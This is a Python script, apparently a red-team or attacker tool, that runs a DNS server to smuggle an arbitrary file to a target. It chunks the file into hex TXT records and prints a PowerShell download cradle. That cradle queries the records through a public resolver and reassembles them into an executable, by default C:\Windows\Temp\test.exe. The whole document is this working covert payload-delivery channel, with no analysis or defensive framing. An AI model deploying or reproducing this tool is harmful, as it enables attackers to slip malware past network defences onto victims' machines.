#!/usr/bin/env python3

import sys
import time
import struct
import hashlib
import argparse
import datetime
import threading
import traceback
import socketserver

try:
    from dnslib import *
except ImportError:
    print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
    sys.exit(1)


class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)


class BaseRequestHandler(socketserver.BaseRequestHandler):

    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
        try:
            data = self.get_data()
            self.send_data(dns_response(data))
        except Exception:
            traceback.print_exc(file=sys.stderr)


class TCPRequestHandler(BaseRequestHandler):

    def get_data(self):
        data = self.request.recv(8192).strip()
        sz = struct.unpack('>H', data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandler):

    def get_data(self):
        return self.request[0]

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


def dns_response(data):
    request = DNSRecord.parse(data)
    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

    qname = request.q.qname
    qn = str(qname).lower()

    print(f'[+] {qn.rstrip(".")}', end='\r')

    qtype = request.q.qtype
    qt = QTYPE[qtype]

    if qn == D or qn.endswith('.' + D):
        for name, rrs in records.items():
            if name == qn:
                for rdata in rrs:
                    rqt = rdata.__class__.__name__
                    if qt in ['*', rqt]:
                        reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=TTL, rdata=rdata))

        for rdata in ns_records:
            reply.add_ar(RR(rname=D, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))

        reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))

    return reply.pack()


def main():
    parser = argparse.ArgumentParser(description='A DNS server in Python.')
    parser.add_argument('name_server', help='NS domain name')
    parser.add_argument('--port', default=53, type=int, help='port to listen on')
    parser.add_argument('--tcp', action='store_true', help='listen for TCP connections')
    parser.add_argument('--udp', action='store_true', help='listen for UDP datagrams')
    parser.add_argument('--file', help='the file to send')
    parser.add_argument('-s', '--sleep', default='300', help='delay between DNS requests')
    parser.add_argument('-o', '--output', default=r'C:\Windows\Temp\test.exe', help='output file path')

    args = parser.parse_args()
    if not (args.udp or args.tcp): parser.error("Please select at least one of --udp or --tcp options")

    global D
    global TTL
    global soa_record
    global ns_records
    global records

    D = DomainName(f'{args.name_server}.')
    IP = '127.0.0.1'
    TTL = 60 * 5

    soa_record = SOA(
        mname=D.ns1,
        rname=D.root,
        times=(
            201307231,
            60 * 60 * 1,
            60 * 60 * 3,
            60 * 60 * 24,
            60 * 60 * 1,
        )
    )
    ns_records = [NS(D.ns1), NS(D.ns2)]

    records = {
        D: [A(IP), AAAA((0,) * 16), MX(D.mail), soa_record] + ns_records,
        D.ns1: [A(IP)],
        D.ns2: [A(IP)],
        D.mail: [A(IP)],
        D.root: [CNAME(D)],
    }

    with open(args.file, 'rb') as f:
        data = f.read()
        print(f'[*] {args.file} SHA256: {hashlib.sha256(data).hexdigest()}')

        i = 0
        for chunk in range(0, len(data), 126):
            i += 1
            #print(f"[*] 'd{i}.{args.name_server}.' = {data[chunk:chunk+126].hex()}")
            records[DomainName(f'd{i}.{args.name_server}.')] = [TXT(data[chunk:chunk + 126].hex())]

    print(f"""[*] PS cradle:\n\nfor($d=1;$d -le {i};$d++){{while (1){{try {{$a=(Resolve-DnsName "d$d.{args.name_server}" -Type TXT -Server 1.1.1.1 -ErrorAction Stop).Strings}}catch{{continue}};break}};$b = @();for ($i=0;$i -le "$a".Length-1;$i=$i+2){{$b+=[convert]::ToByte($a.Substring($i,2),16)}};while (1){{Sleep -mi {args.sleep};try {{Add-Content "{args.output}" -Value $b -Encoding Byte -ErrorAction Stop}}catch {{continue}};break}}}}\n""")
    print(f'[*] Total DNS requests: {i}')

    servers = []
    if args.udp: servers.append(socketserver.ThreadingUDPServer(('', args.port), UDPRequestHandler))
    if args.tcp: servers.append(socketserver.ThreadingTCPServer(('', args.port), TCPRequestHandler))

    for s in servers:
        thread = threading.Thread(target=s.serve_forever)
        thread.daemon = True
        thread.start()

    try:
        while True:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()
    except KeyboardInterrupt:
        pass
    finally:
        for s in servers:
            s.shutdown()

if __name__ == '__main__':
    main()
